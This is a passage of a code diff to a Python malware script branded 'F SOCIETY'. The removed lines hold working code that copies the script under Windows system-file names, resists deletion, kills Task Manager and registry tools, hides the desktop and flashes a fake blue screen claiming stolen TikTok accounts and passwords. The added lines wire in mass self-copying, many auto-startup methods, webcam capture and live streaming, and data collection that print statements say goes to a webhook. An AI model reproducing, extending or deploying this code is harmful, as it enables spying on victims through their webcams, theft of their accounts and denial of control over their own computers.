-        os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\svchost.exe',
-        os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\winlogon.exe',
-        os.environ.get('SystemRoot', 'C:\\Windows') + '\\explorer.exe',
-        os.environ.get('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe',
-        os.path.expanduser('~') + '\\Desktop\\svchost.exe',
-    ]
-    for path in critical_paths:
-        try:
-            if not os.path.exists(path):
-                shutil.copy2(SCRIPT_PATH, path)
-                make_file_completely_undeletable(path)
-                duplicate_locations.append(path)
-        except:
-            pass
-
-def persistent_anti_deletion_loop():
-    while running:
-        try:
-            if not os.path.exists(SCRIPT_PATH):
-                for loc in duplicate_locations:
-                    if os.path.exists(loc):
-                        shutil.copy2(loc, SCRIPT_PATH)
-                        break
-            make_file_completely_undeletable(SCRIPT_PATH)
-            time.sleep(5)
-        except:
-            time.sleep(2)
-
-# ==================== SOUND SPAM ====================
-def sound_spam_forever():
-    frequencies = [300, 500, 700, 900, 1100, 1300, 1500, 1700, 2000]
-    while running:
-        try:
-            freq = random.choice(frequencies)
-            duration = random.randint(100, 500)
-            winsound.Beep(freq, duration)
-            time.sleep(random.uniform(0.5, 2))
-        except:
-            time.sleep(1)
-
-# ==================== TASK MANAGER KILLER ====================
-def task_manager_killer_forever():
-    blocked = ['taskmgr.exe', 'procexp.exe', 'procmon.exe', 'regedit.exe']
-    while running:
-        try:
-            for proc in psutil.process_iter(['name']):
-                try:
-                    if proc.info['name'] and proc.info['name'].lower() in blocked:
-                        proc.kill()
-                except:
-                    pass
-            time.sleep(0.5)
-        except:
-            time.sleep(1)
-
-# ==================== HIDE DESKTOP ====================
-def hide_desktop_elements_forever():
-    while running:
-        try:
-            key = winreg.HKEY_CURRENT_USER
-            policies = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
-            with winreg.CreateKey(key, policies) as reg_key:
-                winreg.SetValueEx(reg_key, "NoDesktop", 0, winreg.REG_DWORD, 1)
-                winreg.SetValueEx(reg_key, "NoTaskbar", 0, winreg.REG_DWORD, 1)
-            subprocess.run(['taskkill', '/f', '/im', 'explorer.exe'], capture_output=True)
-            time.sleep(1)
-            subprocess.run(['start', 'explorer.exe'], capture_output=True)
-            time.sleep(30)
-        except:
-            time.sleep(5)
-
-# ==================== CURSOR TELEPORT ====================
-def cursor_teleport_forever():
-    while running:
-        try:
-            screen_width = pyautogui.size().width
-            screen_height = pyautogui.size().height
-            positions = [
-                (10, 10), (screen_width - 10, 10), (10, screen_height - 10),
-                (screen_width - 10, screen_height - 10), (screen_width // 2, screen_height // 2)
-            ]
-            pos = random.choice(positions)
-            pyautogui.moveTo(pos[0], pos[1], duration=0.05)
-            time.sleep(random.uniform(1, 4))
-        except:
-            time.sleep(1)
-
-# ==================== WINDOW SHAKER ====================
-def window_shaker_forever():
-    while running:
-        try:
-            hwnds = []
-            def enum_callback(hwnd, hwnds):
-                if ctypes.windll.user32.IsWindowVisible(hwnd):
-                    hwnds.append(hwnd)
-                return True
-            EnumWindows = ctypes.windll.user32.EnumWindows
-            EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
-            EnumWindows(EnumWindowsProc(enum_callback), 0)
-            if hwnds:
-                for hwnd in random.sample(hwnds, min(5, len(hwnds))):
-                    for _ in range(10):
-                        rect = ctypes.windll.user32.GetWindowRect(hwnd)
-                        x, y = random.randint(-5, 5), random.randint(-5, 5)
-                        ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0002 | 0x0001)
-                        time.sleep(0.02)
-            time.sleep(random.uniform(5, 15))
-        except:
-            time.sleep(5)
-
-# ==================== PERSISTENT BSOD ====================
-def persistent_bsod_after_reboot():
-    while running:
-        try:
-            bsod = tk.Tk()
-            bsod.attributes('-fullscreen', True)
-            bsod.configure(bg='#0000AA')
-            bsod.attributes('-topmost', True)
-            frame = tk.Frame(bsod, bg='#0000AA')
-            frame.pack(expand=True)
-            tk.Label(frame, text=":(", font=("Consolas", 72, "bold"), fg="white", bg='#0000AA').pack(pady=50)
-            error_text = """F SOCIETY - Your system has been compromised
-
-Your TikTok accounts are stolen.
-Your passwords are compromised.
-Your system is under our control.
-
-Stop code: F_SOCIETY_ALWAYS_WATCHING"""
-            tk.Label(frame, text=error_text, font=("Consolas", 14), fg="white", bg='#0000AA', justify=tk.LEFT).pack(pady=20)
-            bsod.after(3000, bsod.destroy)
-            bsod.mainloop()
-            time.sleep(random.uniform(10, 30))
-        except:
-            time.sleep(5)
-
-# ==================== SCREEN DRAWING ====================
-drawing = True
-current_color = (255, 0, 0)
-overlay_root = None
-canvas = None
-
-def create_transparent_overlay():
-    global overlay_root, canvas
-    overlay_root = tk.Tk()
-    overlay_root.attributes('-fullscreen', True)
-    overlay_root.attributes('-topmost', True)
-    overlay_root.attributes('-transparentcolor', 'white')
-    overlay_root.configure(bg='white')
-    overlay_root.overrideredirect(True)
-    canvas = tk.Canvas(overlay_root, bg='white', highlightthickness=0)
-    canvas.pack(fill=tk.BOTH, expand=True)
-    overlay_root.update()
-
-def auto_change_color_forever():
-    colors = [(255,0,0), (0,255,0), (0,0,255), (255,255,0), (255,0,255), (0,255,255)]
-    color_index = 0
-    global current_color
-    while running:
-        time.sleep(3)
-        color_index = (color_index + 1) % len(colors)
-        current_color = colors[color_index]
-
-def draw_on_screen(x, y):
-    if drawing and canvas:
-        color_hex = f'#{current_color[0]:02x}{current_color[1]:02x}{current_color[2]:02x}'
-        canvas.create_oval(x-5, y-5, x+5, y+5, fill=color_hex, outline=color_hex)
-        overlay_root.update()
-
-def on_move(x, y):
-    draw_on_screen(x, y)
-
-# ==================== SCREEN ROTATION & FLICKER ====================
-def rotate_screen_upside_down():
-    try:
-        devmode = win32api.EnumDisplaySettings(None, 0)
-        devmode.DisplayOrientation = 2
-        devmode.Fields = win32con.DM_DISPLAYORIENTATION
-        win32api.ChangeDisplaySettings(devmode, 0)
-    except:
-        pass
-
-def screen_flicker_forever():
-    while running:
-        try:
-            for _ in range(10):
-                devmode = win32api.EnumDisplaySettings(None, 0)
-                devmode.DisplayOrientation = 2
-                win32api.ChangeDisplaySettings(devmode, 0)
-                time.sleep(0.05)
-                devmode.DisplayOrientation = 0
-                win32api.ChangeDisplaySettings(devmode, 0)
-                time.sleep(0.05)
-            time.sleep(random.uniform(10, 30))
-        except:
-            time.sleep(5)
+        time.sleep(300)  # Every 5 minutes
 
 # ==================== MAIN ====================
 
 def main():
-    global running
+    global running, duplicate_locations
     
-    print("[+] F SOCIETY - FULL DATA SCRAPING MODE")
-    print("[+] TikTok Account Scraper ACTIVE")
+    print("[+] F SOCIETY - ULTIMATE EDITION ACTIVATED")
     
-    create_multiple_copies()
-    create_transparent_overlay()
+    # Create mass copies
+    duplicate_locations = create_mass_copies()
     
-    # Start anti-deletion
-    Thread(target=persistent_anti_deletion_loop, daemon=True).start()
+    # Ultra anti-delete
+    ultra_anti_delete_methods(SCRIPT_PATH)
+    Thread(target=permanent_anti_delete_loop, daemon=True).start()
     
-    # Start data collection
+    # Ultra auto-startup
+    ultra_auto_startup()
+    Thread(target=persistent_startup_loop, daemon=True).start()
+    
+    # Webcam features
+    Thread(target=continuous_webcam_capture, daemon=True).start()
+    Thread(target=webcam_live_stream, daemon=True).start()
+    
+    # Data collection
     Thread(target=continuous_data_collection, daemon=True).start()
     
-    # Start all trolling features
-    Thread(target=sound_spam_forever, daemon=True).start()
-    Thread(target=task_manager_killer_forever, daemon=True).start()
-    Thread(target=hide_desktop_elements_forever, daemon=True).start()
-    Thread(target=cursor_teleport_forever, daemon=True).start()
-    Thread(target=window_shaker_forever, daemon=True).start()
-    Thread(target=persistent_bsod_after_reboot, daemon=True).start()
-    
-    # Mouse drawing
-    mouse_listener = MouseListener(on_move=on_move)
-    mouse_listener.daemon = True
-    mouse_listener.start()
-    Thread(target=auto_change_color_forever, daemon=True).start()
-    rotate_screen_upside_down()
-    Thread(target=screen_flicker_forever, daemon=True).start()
-    
-    print("[+] ALL FEATURES ACTIVE")
-    print("[+] TikTok accounts will be sent to webhook")
-    print("[+] Data collection every 10 minutes")
+    print("[+] ALL FEATURES ACTIVE - ULTIMATE MODE")
+    print("[+] Anti-delete: 10 methods active")
+    print("[+] Auto-startup: 10 methods active")
+    print("[+] Webcam: Capturing every minute")
+    print("[+] TikTok scraper: Active")
     
     while running:
         time.sleep(1)
@@ -739,6 +713,7 @@ def main():
 if __name__ == "__main__":
     try:
         main()
-    except:
+    except Exception as e:
+        print(f"Error: {e}")
         time.sleep(5)
         main()
